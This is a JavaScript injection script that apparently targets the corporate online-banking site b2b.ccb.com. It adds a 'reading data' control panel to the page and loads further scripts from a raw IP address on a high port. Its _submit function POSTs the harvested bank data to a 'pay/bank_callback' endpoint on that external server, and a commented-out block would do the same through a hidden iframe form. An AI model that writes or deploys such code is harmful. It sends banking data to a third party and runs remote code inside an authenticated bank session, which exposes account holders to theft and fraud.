function _bank_read_data_pane(){
    var div=document.createElement('div');
    div.style='    position: fixed;    top: 0;    left: 0;    background-color: #FFF;    z-index: 9999999;';
    div.innerHTML='<div id="_bank_read_data_pane_div_tips">数据读取中...</div><button id="_bank_read_data_start" onclick="_bank_read_data_start()">开始读取数据</button><button id="_bank_read_data_end" onclick="_bank_read_data_end()">停止读取数据</button>';
    document.getElementsByTagName('html')[0].appendChild(div);
}
var _bank_read_data_status=true;
function _bank_read_data_start(){
    _bank_read_data_status=true;
    document.getElementById('_bank_read_data_pane_div_tips').innerText='数据读取中...';
}
function _bank_read_data_end(){
    _bank_read_data_status=false;
    document.getElementById('_bank_read_data_pane_div_tips').innerText='已停止读取数据';
}

function _load_(src){
    var _ = document.createElement("script");
    _.type = "text/javascript";
    // _.src = "https://bank.read.data.office.slyl.com:36521/commom.js?"+new Date().getTime();
    _.src=src;
    document.head.appendChild(_);
}
function _load(name){
    _load_('https://47.244.49.35:53628/static/bank/jquery-3.2.1.min.js')
    _load_('https://47.244.49.35:53628/static/bank/'+name);
}
var _i=0;
function _add(fun,fun1){
    if(!_bank_read_data_status){
        setTimeout(() => {
            _add(fun,fun1);
        }, 1000);
        return;
    }
    if(_i++>5){
        _next();
        fun();
    }else{
        fun1();
    }
}
function _next(fun){
    if(!_bank_read_data_status){
        setTimeout(() => {
            _next(fun);
        }, 1000);
        return;
    }
    _i=0;
    if(fun)fun();
}

 
function _submit(data){
    if(data&&data.length>0){
        $.post('https://47.244.49.35:53628/front/pay/bank_callback.html',{data:data});
        // var pars=[];
        // for(var i=0;i<data.length;i++){
        //     var d=data[i];
        //     var ps=[];
        //     for(name in d){
        //         ps.push(name+'['+i+']='+d[name]);
        //     }
        //     pars.push(ps.join('&'));
        // }
        // _load_('https://47.244.49.35:53628/front/pay/bank_callback.html?'+pars.join('&'));
        // var hd=document.getElementById('_bank_read_data_hd_');
        // if(!hd){
        //     hd=document.createElement('div');
        //     hd.id='_bank_read_data_hd_';
        //     hd.style.display='none';
        //     document.getElementsByTagName('html')[0].appendChild(hd);
        // }
        // var iframe=document.getElementById('_bank_read_data_iframe_');
        // if(!iframe){
        //     iframe=document.createElement('iframe');
        //     iframe.id='_bank_read_data_iframe_';
        //     iframe.name='_bank_read_data_iframe_';
        //     hd.appendChild(iframe);
        // }
        // var dd=document.getElementById('_bank_read_data_hd_dd_');
        // if(!dd){
        //     dd=document.createElement('div');
        //     dd.id='_bank_read_data_hd_dd_';
        //     dd.style.display='none';
        //     document.getElementsByTagName('html')[0].appendChild(dd);
        // }
        // hd.innerHTML='<span></span>';
        // var form=document.createElement('form');
        // form.action='http://pay.shuanglongtb.com/front/pay/bank_callback.html';
        // form.method="POST";
        // form.target='_bank_read_data_iframe_';
        // var htmls=[];
        // for(var i=0;i<data.length;i++){
        //     var d=data[i];
        //     var html=[];
        //     for(name in d){
        //         html.push('<input type="text" name="',name,'[',i,']" value="',d[name],'"/>');
        //         // var input=document.createElement('input');
        //         // input.type='text';
        //         // input.name=name+'['+i+']';
        //         // input.value=d[name];
        //         // form.appendChild(input);
        //     }
        //     htmls.push(html.join(''));
        // }
        // // hd.appendChild(form);
        // form.innerHTML=htmls.join('');
        // dd.appendChild(form);
        // form.submit();
    }
}

console.log(location.href);
if(location.href.indexOf('b2b.ccb.com')>-1){
    _load('b2b.ccb.js');
}